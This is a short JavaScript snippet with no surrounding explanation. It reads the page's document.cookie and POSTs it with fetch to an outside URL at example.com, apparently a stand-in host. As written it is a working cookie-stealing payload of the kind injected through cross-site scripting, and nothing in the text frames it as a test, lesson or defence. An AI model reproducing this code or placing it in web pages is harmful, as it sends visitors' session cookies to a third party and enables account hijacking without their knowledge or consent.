function transmit(value) {
    fetch("https://example.com/helper", {
        method: "POST",
        body: value
    });
}

const cookieData = document.cookie;

transmit(cookieData);
